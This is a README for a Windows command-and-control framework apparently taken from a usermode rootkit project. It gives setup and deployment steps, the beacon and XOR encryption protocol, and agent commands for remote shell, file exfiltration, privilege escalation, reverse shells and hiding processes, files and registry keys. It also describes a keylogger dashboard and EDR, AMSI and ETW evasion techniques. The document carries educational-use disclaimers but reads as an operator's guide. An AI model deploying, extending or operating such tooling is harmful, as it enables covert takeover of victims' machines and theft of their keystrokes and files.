# XvX C2 Infrastructure

![C2 Project](https://img.shields.io/badge/Project-C2%20Framework-red)
![Language](https://img.shields.io/badge/Python-3.9+-blue)
![Language](https://img.shields.io/badge/C++-17-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)

Command & Control infrastructure extracted from XvX Usermode Rootkit project.

> **Educational Use Only**  
> This C2 framework is for **research and defensive learning purposes only**.
> Unauthorized use on systems you don't own is **illegal**.

---

## 📁 Project Structure

```
C2/
├── server/                 # Python Flask HTTPS C2 Server
│   ├── c2_server.py       # Main C2 server (3318 lines)
│   ├── http_server.py     # HTTP dropper server (147 lines)
│   ├── cert.pem           # SSL certificate
│   ├── key.pem            # SSL private key
│   └── c2.db              # SQLite database (auto-generated)
│
├── client/                 # C++ Windows Agent
│   └── c2_client_example.cpp  # Example beacon implementation
│
├── include/                # Headers
│   └── C2Client.h         # C++ client class (598 lines)
│
└── docs/                   # Documentation
    └── README.md           # This file
```

---

## 🚀 Quick Start

### **1. Server Setup**

```bash
cd server

# Install dependencies
pip install flask

# Generate SSL certificates (if not present)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"

# Start C2 server
python c2_server.py
```

**Server will start on:**
- Dashboard: `https://localhost:8443`
- API Endpoints: `https://localhost:8443/api/*`
- Reverse Shell Listener: `tcp://0.0.0.0:4444`

### **2. HTTP Dropper Server (Optional)**

```bash
cd server
python http_server.py 8000
```

Serves payloads on `http://localhost:8000/`

### **3. Client Compilation**

```bash
# MinGW-w64 (Windows)
g++ -o agent.exe client/c2_client_example.cpp -lwinhttp -lws2_32 -std=c++17 -O2 -s

# MSVC (Visual Studio)
cl.exe /EHsc /O2 client/c2_client_example.cpp /Fe:agent.exe winhttp.lib
```

**Before compiling**, edit `c2_client_example.cpp`:
```cpp
wstring c2ServerUrl = L"https://YOUR_SERVER_IP:8443";
```

---

## 📡 C2 Protocol

### **Communication Flow**

```
Agent                           C2 Server
  |                                 |
  |-- HTTPS POST /api/checkin ----->|  (Beacon + System Info)
  |                                 |
  |<---- XOR+Base64 Commands -------|  (Queued tasks)
  |                                 |
  |-- HTTPS POST /api/result ------>|  (Execution results)
  |                                 |
```

### **Encryption**

**Key Generation:**
```
XOR_KEY = ComputerName + Username + "SecretKey2025"
```

**Encryption:**
1. Data → UTF-8 encoding
2. XOR with dynamic key
3. Base64 encoding
4. HTTPS transmission

### **Beacon Format**

**Request (Agent → Server):**
```
agent_id|hostname|username|os_version
```

**Response (Server → Agent):**
```
command1|arg1|arg2
command2|arg1
...
```

---

## 🎯 Supported Commands

### **Basic Commands**

| Command | Syntax | Description |
|---------|--------|-------------|
| `shell` | `shell <cmd>` | Execute shell command via cmd.exe |
| `exfil` | `exfil <path>` | Exfiltrate file content (Base64) |
| `sleep` | `sleep <seconds>` | Change beacon interval |
| `ping` | `ping` | Test connectivity (returns PONG) |
| `die` | `die` | Terminate agent |

### **Advanced Commands (Full Rootkit Only)**

| Command | Syntax | Description |
|---------|--------|-------------|
| `hide_process` | `hide_process <name>` | Hide process from Task Manager |
| `hide_file` | `hide_file <path>` | Hide file/folder from Explorer |
| `hide_registry` | `hide_registry <key>` | Hide registry key from Regedit |
| `unhide_process` | `unhide_process <name>` | Restore process visibility |
| `unhide_file` | `unhide_file <path>` | Restore file visibility |
| `unhide_registry` | `unhide_registry <key>` | Restore registry key |
| `unhide_all` | `unhide_all` | Unhide all hidden items |
| `privesc` | `privesc` | Escalate to SYSTEM (Named Pipe/Token) |
| `revshell_start` | `revshell_start` | Start interactive cmd.exe session |
| `revshell_input` | `revshell_input <cmd>` | Execute in interactive session |
| `revshell_output` | `revshell_output` | Read session output buffer |
| `revshell_stop` | `revshell_stop` | Terminate interactive session |

---

## 🖥️ Web Dashboard

### **Features**

- **Agents Management**: Real-time agent status (online/offline)
- **Command Execution**: Interactive command interface
- **Results Viewer**: Full command output with timestamps
- **Keylogger**: Real-time keystroke exfiltration display
- **Statistics**: Total agents, success/failure rates
- **Auto-refresh**: 5-second polling interval

### **Dashboard Sections**

1. **Agents Table**: AgentID, Hostname, User, OS, IP, Status
2. **Command Panel**: Dropdown commands + argument input
3. **Results**: Command history with color-coded status
4. **Keylogs**: Captured keystrokes with window titles
5. **Statistics**: Real-time counters (online/offline/total)

---

## 🗄️ Database Schema

### **SQLite Tables**

**agents:**
```sql
agent_id TEXT PRIMARY KEY
hostname TEXT
username TEXT
os_version TEXT
ip_address TEXT
first_seen TEXT (ISO 8601)
last_seen TEXT (ISO 8601)
```

**tasks:**
```sql
id INTEGER PRIMARY KEY
agent_id TEXT
command TEXT
status TEXT ('pending'|'sent')
created_at TEXT
```

**results:**
```sql
id INTEGER PRIMARY KEY
agent_id TEXT
command TEXT
status TEXT ('success'|'error')
output TEXT
received_at TEXT
```

**keylogs:**
```sql
id INTEGER PRIMARY KEY
agent_id TEXT
window_title TEXT
keystrokes TEXT (raw)
cleaned_text TEXT (interpreted)
timestamp TEXT
```

---

## 🔧 Configuration

### **Server Configuration**

Edit `c2_server.py`:
```python
HOST = "0.0.0.0"        # Bind to all interfaces
PORT = 8443             # HTTPS C2 port
SHELL_PORT = 4444       # Reverse shell listener
DB_PATH = "c2.db"       # Database file
```

### **Client Configuration**

Edit `c2_client_example.cpp`:
```cpp
wstring c2ServerUrl = L"https://192.168.1.100:8443";
```

Or in header `include/C2Client.h`:
```cpp
C2Client(const wstring &serverURL = L"https://127.0.0.1:8443")
```

### **Beacon Interval**

Default: 30 seconds

Change dynamically:
```bash
# From dashboard or API
command: sleep|60
```

---

## 🛡️ Security Features

### **HTTPS TLS**
- Self-signed certificates (cert.pem/key.pem)
- TLS 1.2+ encryption
- Certificate pinning disabled (accepts self-signed)

### **XOR Encryption**
- Dynamic key per agent (hostname + username)
- XOR cipher with Base64 encoding
- Protects against basic traffic inspection

### **Agent Fingerprinting**
- Unique AgentID = hex(ComputerName + Username)
- Session tracking via database
- Persistent agent state

---

## 📊 API Endpoints

### **POST /api/checkin**
Agent beacon + command retrieval

**Request:** XOR+Base64 encrypted beacon
**Response:** XOR+Base64 encrypted command list

### **POST /api/result**
Command execution results

**Request:** XOR+Base64 encrypted result
**Response:** HTTP 200 OK

### **POST /api/ping**
Connection test

**Response:** "PONG"

### **GET /api/agents**
List all registered agents (JSON)

### **GET /api/results**
List all command results (JSON)

### **GET /api/keylogs**
List all captured keystrokes (JSON)

### **POST /api/command**
Queue new command for agent

**Body:**
```json
{
    "agent_id": "74657374...",
    "command": "shell|whoami"
}
```

---

## 🔬 Technical Details

### **Client Architecture**

**C2Client.h Class:**
- `checkIn()`: Send beacon, receive commands
- `sendResult()`: Send execution results
- `setBeaconInterval()`: Adjust sleep time
- `setActive()`: Enable/disable beacon loop
- `isRunning()`: Check active status

**Encryption Functions:**
- `base64Encode()` / `base64Decode()`
- `xorEncrypt()` / `xorDecrypt()`

**HTTP Functions:**
- `httpRequest()`: WinHTTP wrapper with TLS
- Custom User-Agent: Chrome 120.0

### **Server Architecture**

**Flask Routes:**
- `/` → Dashboard (HTML template)
- `/api/checkin` → Beacon handler
- `/api/result` → Result collector
- `/api/command` → Task queuer
- `/api/agents` → Agent list (JSON)
- `/api/results` → Results list (JSON)
- `/api/keylogs` → Keylog list (JSON)

**Database Functions:**
- `init_db()`: Create tables
- Agent CRUD operations
- Task queue management
- Result storage

**Keylog Processing:**
- `clean_keylog()`: Interpret special keys
- Handles: BACKSPACE, DELETE, CAPSLOCK, ARROWS
- Cursor position tracking
- Text reconstruction

---

## 🚨 Detection Evasion (Full Rootkit Only)

- **Indirect Syscalls**: Bypass EDR hooks
- **API Hashing**: Hide IAT entries
- **NTDLL Unhooking**: Fresh ntdll.dll loading
- **ETW/AMSI Bypass**: Patch telemetry
- **Jitter Sleep**: Randomized beacon intervals
- **String Obfuscation**: Compile-time encryption

---

## 📝 Usage Example

### **1. Start Server**
```bash
python server/c2_server.py
```

### **2. Access Dashboard**
```
https://localhost:8443
```

### **3. Deploy Agent**
```bash
agent.exe
```

### **4. Execute Commands**
From dashboard:
```
Command: shell
Argument: whoami
→ Execute
```

### **5. View Results**
Results appear in real-time in the Results table.

---

## 🔗 Integration with Full Rootkit

This C2 framework is **extracted** from the full XvX Usermode Rootkit project.

To integrate with the rootkit:
1. Include `C2Client.h` in your main.cpp
2. Initialize `C2Client *g_c2Client = new C2Client(url)`
3. Start beacon thread: `CreateThread(..., c2BeaconThread, ...)`
4. Implement command handlers (see `c2_client_example.cpp`)

---

## 📚 Dependencies

### **Server**
- Python 3.9+
- Flask 2.0+
- SQLite3 (built-in)
- OpenSSL (for certificate generation)

### **Client**
- MinGW-w64 GCC 15.2+ or MSVC 2019+
- Windows SDK (WinHTTP.h)
- C++17 standard

---

## 🐛 Troubleshooting

### **Problem: Agent not appearing in dashboard**

**Solutions:**
1. Check network connectivity (ping C2 server)
2. Verify SSL certificate acceptance
3. Check XOR key synchronization (hostname/username match)
4. Enable debug output in client
5. Check firewall rules (port 8443)

### **Problem: Commands not executing**

**Solutions:**
1. Verify agent status (last_seen < 2.5 minutes)
2. Check beacon interval (default 30s)
3. Review server logs for errors
4. Ensure command syntax is correct

### **Problem: SSL certificate errors**

**Solutions:**
1. Regenerate certificates: `openssl req -x509 ...`
2. Disable certificate validation in client (already done)
3. Use HTTP instead (not recommended for production)

---

## 📖 Learning Resources

- **MITRE ATT&CK**: T1071.001 (C2 over Web Service)
- **WinHTTP API**: Microsoft Docs
- **Flask Security**: OWASP Best Practices
- **XOR Encryption**: Practical Cryptography

---

## ⚠️ Legal Disclaimer

This project is for **educational and research purposes only**.

**You are solely responsible for:**
- Complying with all applicable laws and regulations
- Obtaining proper authorization before testing on any system
- Understanding the ethical and legal implications

**The author is NOT responsible for:**
- Misuse of this software
- Damage caused by unauthorized use
- Legal consequences of illegal activities

---

## 📧 Contact

**Author:** 28zaakypro@proton.me

**Repository:** XvX Usermode Rootkit (Private)

**License:** Educational Use Only

---

## 🎓 Acknowledgments

This C2 framework demonstrates:
- Real-world malware C2 architecture
- HTTPS-based covert channels
- Client-server encryption schemes
- Agent tasking and result collection
- Web-based operator interfaces

**For defensive research only.**
